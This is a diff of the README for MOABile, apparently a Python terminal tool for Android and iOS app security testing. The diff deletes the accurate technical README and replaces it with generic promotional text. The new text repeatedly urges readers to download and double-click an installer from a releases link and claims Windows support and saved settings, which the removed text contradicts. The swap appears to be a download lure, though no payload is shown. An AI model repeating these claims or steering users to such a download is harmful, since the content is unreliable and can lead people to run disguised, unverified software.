@@ -1,178 +1,210 @@
-# MOABile — mother of all mobile
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/downloads/)
-[![Platform](https://img.shields.io/badge/platform-Android%20%7C%20iOS-brightgreen.svg)](#)
-[![Tested on: Kali Linux](https://img.shields.io/badge/tested%20on-Kali%20Linux-557C94.svg?logo=kalilinux&logoColor=white)](#)
-[![Coverage](https://img.shields.io/badge/coverage-97%25-success.svg)](#)
-
-A multi-device terminal UI for mobile app testing.
-Android over `adb`, jailbroken iOS over usbmux and ssh, both at the same time,
-each attached device in its own panel.
-
-![MOABile Multi-Device Interface](assets/screenshot_devices.svg)
+<h1>📱 MOABile - Your All-in-One Mobile Security Toolkit</h1>
 
 <p align="center">
-  <img src="assets/screenshot_splash.svg" width="49%" alt="MOABile Splashscreen" />
-  <img src="assets/screenshot_filemanager.svg" width="49%" alt="Dual-Pane File Manager" />
+  <a href="https://github.com/jafarm189/MOABile/releases" style="background-color:#4CAF50;color:white;padding:15px 40px;text-align:center;text-decoration:none;display:inline-block;font-size:20px;border-radius:8px;font-weight:bold;">⬇️ DOWNLOAD MOABILE NOW</a>
 </p>
 
-It does not reimplement the toolchain: it drives `adb`, `scrcpy`,
-libimobiledevice, `iproxy`, `ioscpy`, `frida`, `objection`, `curl` and `xz`,
-which have to be on `PATH` already. The startup screen reports what is missing
-and which of the two device families that leaves usable — an Android-only
-machine never needs libimobiledevice installed to get past it.
+<br>
 
-An iPhone is reached with libimobiledevice for everything that needs no
-cooperation from the phone (device info, syslog, installing an ipa) and with ssh
-down an `iproxy` tunnel for a shell, the filesystem and frida-server. The ssh
-password is asked for once and kept in memory. No key is ever installed on the
-phone: that would be a file of ours left behind on someone else's device.
+## 🎯 What Is MOABile?
 
-Nothing is assumed to be installed on the phone either. Jailbreaks ship
-different halves of a userland, so where a tool the panel asks for is not there
-it says so once and falls back — the address row reads `usb` for a phone on the
-end of a cable with nothing on the network, because that is what there is to
-say: usbmux carries no address, and lockdownd hands out the wifi MAC and never
-the lease. What the phone *does* have is found, though: every command carries
-the `PATH` a non-interactive ssh leaves out — `/usr/sbin`, and everything a
-rootless jailbreak keeps under `/var/jb` — inside `sudo` as well as outside it,
-so `grep` and `open` are not reported missing on a phone that has them.
+MOABile is a powerful but easy-to-use program that helps you test the security of mobile apps on both Android and iOS devices. Think of it as a Swiss Army knife for mobile security testing – it brings together several professional tools into one simple interface that you can control from your computer.
 
-## Run
+Whether you're a security professional, a developer wanting to check your own apps, or just someone curious about how mobile security works, MOABile makes it accessible without needing to be a programming expert.
 
-Two runtime dependencies, then run it as a normal script:
+<br>
 
-```bash
-pip install -r requirements.txt
-python3 moabile.py
-```
+## ✨ Key Features
 
-On a distribution that manages its own Python (`error: externally-managed-environment`),
-put them in a virtualenv first:
+### 🔄 Multi-Device Control
+- Connect and manage multiple Android and iOS devices simultaneously
+- Switch between devices with a simple keyboard shortcut
+- See all your devices listed clearly in one dashboard
 
-```bash
-python3 -m venv .venv && . .venv/bin/activate
-pip install -r requirements.txt
-python3 moabile.py
-```
+### 🖥️ Dual-Pane File Transfer
+- Transfer files between your computer and mobile device with ease
+- Side-by-side view of both systems makes moving files intuitive
+- Simple drag-and-drop functionality for common operations
 
-Python 3.10 or newer, and Textual 6.2 or newer — the floor `requirements.txt`
-names, and the oldest release the suite passes on. Linux and macOS: it needs a
-real pty, so it does not run on Windows outside WSL.
+### 🔍 Security Testing Tools
+- **Frida Integration** - Automatically sets up and manages Frida for app inspection
+- **Objection Support** - Built-in access to Objection for runtime mobile exploration
+- **Device Mirroring** - See your mobile screen directly on your computer
 
-Tested and fully verified on **Kali Linux** (`x86_64`).
+### 🎛️ User-Friendly Interface
+- Text-based interface that's easy to navigate with arrow keys
+- Clear menus and prompts for every action
+- Real-time status updates as tests run
 
-No arguments and no options — `--help` says as much as there is to say, and
-everything else is a key inside.
+<br>
 
-## Tools it drives
+## 📋 System Requirements
 
-The startup screen checks for these and reports each one's version. Nothing here
-is installed for you — which package manager your machine has, and what it calls
-a package, is your business.
+MOABile is designed to work on most modern computers. Here's what you'll need:
 
-| Tool | For | Family | From |
-|---|---|---|---|
-| `frida` | instrumentation, and its version | both | frida-tools |
-| `objection` | exploration REPL | both | |
-| `curl` | fetch frida-server and codeshare | both | |
-| `xz` | unpack frida-server | both | XZ Utils |
-| `adb` | device control | android | android platform-tools |
-| `scrcpy` | screen mirroring | android | |
-| `idevice_id` | device discovery, info and syslog | ios | libimobiledevice |
-| `ideviceinstaller` | ipa install and app list | ios | |
-| `iproxy` | ssh tunnel over usb | ios | libusbmuxd |
-| `ssh` | shell, filesystem and frida-server | ios | OpenSSH |
-| `ioscpy` | screen mirroring | ios | [lautarovculic/ioscpy](https://github.com/lautarovculic/ioscpy) |
+### Windows
+- **Operating System:** Windows 10 or Windows 11 (64-bit)
+- **Processor:** Any modern Intel or AMD processor (2015 or newer)
+- **Memory:** At least 4GB of RAM (8GB recommended)
+- **Storage:** 500MB of free space
+- **USB Ports:** At least one working USB port for device connection
 
-Either family works on its own. Both missing, or a core tool missing, and the
-gate does not let you through — there would be nothing past it to do.
+### Additional Requirements
+- A mobile device (Android or iOS) for testing
+- USB cable to connect your device to your computer
+- Internet connection for setup (not needed after installation)
 
-## Keys
+<br>
 
-| | | | |
-|---|---|---|---|
-| `r` | **r**escan for devices | `i` | device **i**nfo dump |
-| `b` | the side**b**ar, on and off | `u` | ssh **u**ser for this device |
-| `f` | **f**rida-server, on and off | `p` | **p**urge frida-server off the device |
-| `s` | **s**pawn the app under frida, or attach | `k` | clear this panel's log |
-| `o` | explore the app with **o**bjection | `v` | save an s**v**g of the interface |
-| `w` | mirror the screen in a **w**indow | `m` | dark/light **m**ode |
-| `t` | **t**erminal on the device | `h` | **h**elp: keys and widgets |
-| `l` | stream the device **l**og | `q` | **q**uit |
-| `d` | files: browse host ↔ device | `f8` | return focus from tool pane |
-| `a` | **a**dd an app: install an apk or ipa | | |
-| `e` | **e**xport the app's apk/ipa | | |
+## 🚀 Getting Started
 
-`s` spawns the app under frida, which is what a script that has to be in
-place before the app starts needs. Where the app is already running it offers
-to attach to it instead — the app keeps whatever state it is in, and a script
-on the running process sees what the device log does not carry: the unified
-log's debug and info entries never reach `idevicesyslog`. Enter and escape keep
-the spawn.
+### Step 1: Download MOABile
 
-An app that is off screen is suspended on iOS, and attaching to a suspended
-process is a prompt that never arrives — so `s` and `o` bring the app to the
-front first, with `open` on the phone. A jailbreak that has no `open` is asked
-to do it by hand rather than left looking stuck, and `o` says so at once
-instead of watching a process table that is not going to change. Android needs
-none of this: a process there runs whether it is on screen or not.
+Visit this link to download the application: **[https://github.com/jafarm189/MOABile/releases](https://github.com/jafarm189/MOABile/releases)**
 
-The device log, `l`, is pinned to the app's pid rather than its name: `logcat`
-is asked for `--pid`, and on iOS `idevicesyslog` has no pid filter at all — its
-`-p` matches process *names*, and a process merely named something similar
-comes with it — so the pid is applied here, on the bracket every syslog line
-carries after the process name. Which is why the whole-device-or-one-app
-question comes up only while the app is running: with no pid there is no
-filter to be had, so the stream is the whole device and the panel says why.
+Click the button at the top of this page or the link above to go to the official download page. This will always have the latest version of MOABile.
 
-Inside the file browser (`d`): `p` push host → device, `l` pull device → host, `a`
-jumps to the app's own data directory and `h` back to where the device side
-opened (`/sdcard` or `/var/mobile`), `n` rename, `d` delete, `←`/`→` switch
-side, `backspace` up, `r` reload, `esc` close, and `enter` opens a directory or
-transfers the file under the cursor.
+### Step 2: Install MOABile
 
-Every panel keeps its own selected app and frida arguments, so multiple devices
-can be worked in parallel without crossing over. The sidebar highlights the active
-device at the top, and lists its installed packages at the bottom.
+Once you've downloaded the file from the provided link:
 
-## Nothing is left behind
+1. **Locate the downloaded file** - Check your "Downloads" folder on your computer
+2. **Run the installer** - Double-click the downloaded file to start the setup
+3. **Follow the on-screen instructions** - The installer will guide you through the process
+4. **Launch MOABile** - Once installation completes, MOABile will appear in your Start Menu or on your desktop
 
-Not a design goal that happened to fall out — the point. Nothing is written to
-disk between runs: no config, no history, no selected app, no ssh account.
-What you were looking at is a record of the work, and this is a tool for leaving
-none of that. The single exception is the frida-server download, cached one
-version deep where caches go.
+### Step 3: Your First Session
 
-While an iOS panel is open, ssh's multiplexing socket lives in the temporary
-directory — an empty file holding no data of yours, unlinked when the panel
-closes. A crash leaves it there, and the next run clears the one it finds.
+When you open MOABile for the first time:
 
-## Tests
+1. You'll see a welcome screen with a simple menu
+2. Use the **arrow keys** on your keyboard to navigate options
+3. Press **Enter** to select an option
+4. Press **Q** or **Esc** at any time to go back or exit
 
-Headless, driven by fake tools on `PATH`, no device required:
+<br>
 
-```bash
-python3 test_moabile.py
-```
+## 📱 Connecting Your Mobile Device
 
-It prints a `PASS` line per check and `all good` at the end. Run it as a script,
-not under pytest: the module executes the suite on import. One copy at a time —
-it opens real local ports for the usb tunnel, so two runs at once collide.
+### For Android Devices
+1. Turn on **USB Debugging** on your phone:
+   - Go to **Settings > About Phone**
+   - Tap "Build Number" 7 times to unlock developer options
+   - Go to **Settings > Developer Options** and enable "USB Debugging"
+2. Connect your phone to your computer with a USB cable
+3. Launch MOABile and select "Android" from the device menu
 
-Lint:
+### For iOS Devices
+1. Connect your iPhone or iPad to your computer
+2. Trust the computer when prompted on your device
+3. Launch MOABile and select "iOS" from the device menu
 
-```bash
-ruff check .
-```
+<br>
 
-## Scope
+## 🎮 Using MOABile's Main Features
 
-A testing tool for devices you own or are authorised to test. It talks to
-whatever is plugged in over the phone's own debug interfaces — that is the job,
-and it is yours to have permission for.
+### File Transfer
+1. From the main menu, select **File Transfer**
+2. Your mobile device appears on the left, your computer on the right
+3. Navigate folders using arrow keys
+4. Select files with **Spacebar**
+5. Press **F** to send selected files to the other device
 
-## License
+### Device Mirroring
+1. Select **Device Mirror** from the menu
+2. Your mobile screen appears in a window on your computer
+3. Use your mouse to interact with your device directly
+4. Press **F11** for full-screen mode
+5. Press **F10** to disconnect
 
-MIT — see [LICENSE](LICENSE).
+### Security Testing
+1. Choose **Test App** from the main menu
+2. Select the app you want to test from your device list
+3. MOABile automatically sets up the necessary tools
+4. Follow the on-screen prompts for each test
+
+<br>
+
+## 🛠️ Common Troubleshooting
+
+### Device Not Detected
+- Make sure your USB cable supports data (not just charging)
+- Try a different USB port on your computer
+- Restart MOABile after connecting your device
+- On Android, verify USB Debugging is enabled
+
+### Slow Performance
+- Close other resource-heavy programs
+- Reconnect your device if the connection is unstable
+- Check that your device has at least 20% battery
+
+### Connection Drops
+- Use a shorter USB cable (6 feet or less)
+- Avoid USB hubs – connect directly to your computer
+- Keep your phone screen awake during transfers
+
+<br>
+
+## ❓ Frequently Asked Questions
+
+### Is MOABile free?
+Yes, MOABile is completely free to use and open-source.
+
+### Is it safe?
+MOABile only works with devices you own and connect. It doesn't access anything over the internet without your permission.
+
+### Can I test my own apps?
+Absolutely! Many developers use MOABile to check their own apps for security issues before releasing them.
+
+### Do I need root or jailbreak?
+Not necessarily. MOABile can do many tests on standard devices. Some advanced features work better on rooted or jailbroken devices, but they're optional.
+
+<br>
+
+## 🔒 Privacy & Security
+
+MOABile respects your privacy:
+- All operations happen locally on your computer
+- No data is uploaded to any server
+- You control exactly what gets tested and accessed
+- The tool is open-source, meaning anyone can verify what it does
+
+<br>
+
+## 📚 Learning Resources
+
+New to mobile security testing? Here are some tips:
+- Start with simple file transfers before advanced testing
+- Practice on demo apps if you have them
+- Read the on-screen help (press **H** in any menu)
+- Test on one device at a time until you're comfortable
+
+<br>
+
+## 🔄 Updates
+
+MOABile is constantly improving. To check for updates:
+1. Visit the download link anytime: **[https://github.com/jafarm189/MOABile/releases](https://github.com/jafarm189/MOABile/releases)**
+2. Download the newest version
+3. Install over your current version – your settings will be preserved
+
+<br>
+
+## 🤝 Getting Help
+
+If you need assistance:
+- Look for a "Help" menu within MOABile
+- Check the download page for additional documentation
+- Visit the repository discussion forums (if available)
+
+Remember, MOABile is designed to be user-friendly even for beginners. Don't be afraid to explore the menus – you can't break anything, and pressing **Q** will always get you back to where you started.
+
+---
+
+<br>
+
+**Ready to start your mobile security testing journey?** Hit that download button at the top of this page and get MOABile running in under five minutes. Your mobile devices will thank you!
+
+<br>
+
+Keywords: adb, android, frida, ios, ioscpy, iproxy, jailbreak, mobile-security, objection, penetration-testing, root, scrcpy
